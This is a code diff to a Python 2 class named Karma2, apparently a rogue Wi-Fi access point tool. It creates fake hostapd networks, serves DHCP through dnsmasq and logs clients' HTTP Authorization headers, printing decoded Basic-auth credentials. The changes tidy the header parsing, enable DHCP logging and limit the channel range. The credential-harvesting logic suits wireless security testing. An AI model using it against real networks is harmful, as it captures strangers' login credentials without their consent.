@@ -97,20 +97,20 @@ class Karma2:
       
       http_auth = self.headers.get('Authorization')
       if http_auth is not None:
-        atype,avalue = http_auth.split(' ')
-        if atype == 'Basic':
+        params = http_auth.split(' ')
+        if params[0] == 'Basic':
           print "%s HTTP Basic authorization from %s to host %s: %s"%(
             _ctxt('[*]',YELLOW),
             client,
             host,
-            _ctxt(base64.decodestring(avalue), YELLOW))
+            _ctxt(base64.decodestring(params[1]), YELLOW))
         else:
           print "%s HTTP %s authorization from %s to host %s: %s"%(
             _ctxt('[*]',YELLOW),
-            atype,
+            params[0],
             client,
             host,
-            avalue)
+            http_auth)
 
       if path == 'generate_204' or path == 'gen_204':
         self.send_response(204)
@@ -330,7 +330,6 @@ class Karma2:
           line = self.dhcpd_process.stderr.readline()
           if len(line) == 0:
             continue
-          
           m = re.match(
             r".*failed.*", line)
           if m is not None:
@@ -415,9 +414,10 @@ class Karma2:
     def start_dhcpd(self, iface, subnet):
       # create a temporary file
       print "[+] Starting dhcp server %s %s"%(iface,subnet.range())
+
       cmd = ['dnsmasq',
         '-d',
-        #'--log-dhcp',
+        '--log-dhcp',
         '--bind-dynamic',
         '--log-facility=-',
         '-i', iface,
@@ -451,7 +451,7 @@ class Karma2:
       print "[+] Creating (hostapd) AP %s"%_ctxt(essid,GREEN)
 
       interface = self.ifhostapd.str()
-      channel = random.randint(1,15)
+      channel = random.randint(1,11)
 
       f = tempfile.NamedTemporaryFile(delete=False)
       f.write("ssid=%s\n"%(essid))
